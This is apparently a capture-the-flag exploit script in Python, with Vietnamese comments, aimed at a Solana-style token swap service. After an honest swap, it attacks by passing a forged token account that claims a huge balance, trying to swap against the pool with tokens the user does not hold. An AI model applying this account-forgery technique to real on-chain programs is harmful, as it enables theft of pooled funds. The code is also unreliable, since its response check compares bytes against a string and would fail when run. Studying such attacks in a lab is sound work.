"""Thu nghiem chinh: dung 'ix len:'/'swap reverted'/'remaining' lam oracle.

Grammar da do:
  dong 1 : <num accounts>
  dong 2n: <address> <owner> [lamports] [datahex]   (moi account 1 dong)
  dong cuoi cua buoc: <ix len> roi <ix hex>
"""
import sys

import svc
from b58 import (SYSTEM, TOKEN2022, b58encode, pool_data, randkey,
                 token_account, ix_swap_a_to_b)

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ORDER = ["pool", "authority", "user", "user_a", "user_b",
         "vault_a", "vault_b", "mint_a", "mint_b", "token_program"]
OWNER = {"pool": "program", "authority": "sys", "user": "sys",
         "user_a": "tok", "user_b": "tok", "vault_a": "tok", "vault_b": "tok",
         "mint_a": "tok", "mint_b": "tok", "token_program": "tok"}


class Session:
    def __init__(self):
        self.s = svc.Svc()
        b = self.settle(9.0)
        self.A = {}
        for l in b.splitlines():
            if ": " in l:
                k, v = l.split(": ", 1)
                self.A[k.strip()] = v.strip()
        self.reserve = int(self.A.get("reserve_b", 0))

    def settle(self, cap=12.0, quiet=1.2):
        txt = ""
        for _ in range(6):
            c = self.s.rd(4.0)
            txt += c.decode("utf-8", "replace")
            if not c or c.endswith(b": \n") or b"no flag." in txt \
               or b"reverted" in txt:
                break
        return txt

    def own(self, who):
        o = OWNER[who]
        return {"sys": SYSTEM, "tok": self.A["token_program"],
                "program": self.A["program"]}[o]

    def line(self, x):
        self.s.s.sendall((x + "\n").encode())
        return self.settle(9.0).encode()

    def attempt(self, specs, data):
        """specs: list cua (address, owner[, lamports[, datahex]])."""
        log = [self.line(str(len(specs)))]
        for sp in specs:
            r = self.line(" ".join(sp))
            log.append(r)
            if b"no flag" in r or b"reverted" in r:
                return r, log
        self.line(str(len(data)))
        r = self.line(data.hex())
        log.append(r)
        return r, log

    def close(self):
        self.s.close()


def show(tag, r):
    print("  [%s] %r" % (tag, r[:160]), flush=True)


def t_honest(amount):
    print("=== honest SwapAToB amount=%d (user_src = banner user_a)" % amount)
    sv = Session()
    specs = [(sv.A[k], sv.own(k)) for k in ORDER]
    r, log = sv.attempt(specs, ix_swap_a_to_b(amount))
    for i, x in enumerate(log):
        if x:
            print("   log%-2d %r" % (i, x[-90:]), flush=True)
    show("resp", r)
    sv.close()


def t_forged(rounds=4):
    print("=== forged rich user_src")
    for it in range(rounds):
        sv = Session()
        rich = randkey(1000 + it)
        data = token_account(sv.A["mint_a"], sv.A["user"], 10 ** 15)
        specs = [(sv.A["pool"], sv.own("pool")),
                 (sv.A["authority"], sv.own("authority")),
                 (sv.A["user"], sv.own("user")),
                 (rich, sv.A["token_program"], "1000000000", data.hex()),
                 (sv.A["user_b"], sv.own("user_b")),
                 (sv.A["vault_a"], sv.own("vault_a")),
                 (sv.A["vault_b"], sv.own("vault_b")),
                 (sv.A["mint_a"], sv.own("mint_a")),
                 (sv.A["mint_b"], sv.own("mint_b")),
                 (sv.A["token_program"], sv.A["token_program"])]
        amt = 10 ** 12
        r, log = sv.attempt(specs, ix_swap_a_to_b(amt))
        for i, x in enumerate(log):
            if x and i < 6:
                print("   log%-2d %r" % (i, x[-90:]), flush=True)
        show("it%d" % it, r)
        sv.close()


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "honest"
    if which == "honest":
        t_honest(int(sys.argv[2]) if len(sys.argv) > 2 else 10)
    elif which == "forged":
        t_forged()
